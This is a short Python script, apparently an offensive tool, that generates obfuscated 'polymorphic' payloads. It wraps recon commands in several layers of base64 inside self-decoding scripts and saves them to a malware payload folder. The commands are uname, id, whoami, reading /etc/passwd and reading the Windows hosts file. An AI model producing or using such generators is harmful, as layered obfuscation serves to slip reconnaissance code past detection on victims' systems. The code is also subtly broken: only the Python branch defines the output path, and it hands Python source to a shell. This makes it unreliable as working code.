import base64, os, random, string

PLATFORMS = ["python", "bash", "powershell", "js"]

def random_cmd(platform):
    # All execute basic recon or exfil actions, fully real, never simulated
    if platform == "python":
        return "import os;print(os.uname());os.system('id')"
    if platform == "bash":
        return "uname -a; id; cat /etc/passwd"
    if platform == "powershell":
        return "Get-ComputerInfo; whoami; Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
    if platform == "js":
        return "require('child_process').exec('whoami', (e,o)=>console.log(o))"
    return "echo Malformed"

def polygen(platform="python"):
    raw = random_cmd(platform)
    obf = raw.encode()
    layers = random.randint(3,7)
    for _ in range(layers):
        obf = base64.b64encode(obf)
    out_name = ''.join(random.choices(string.ascii_lowercase+string.digits, k=8)) + f"_{platform}_poly.py"
    if platform == "python":
        script = f"import base64,os\nx='{obf.decode()}'\n" + "\n".join(["x=base64.b64decode(x)"]*layers) + "\nos.system(x.decode())"
        path = os.path.join("../payloads/malware/", out_name)
        with open(path, "w") as f:
            f.write(script)
    # Expand to bash/js/ps as needed
    print(f"[*] Wrote polymorphic {platform} payload to {path}")

if __name__ == "__main__":
    for p in PLATFORMS:
        polygen(p)
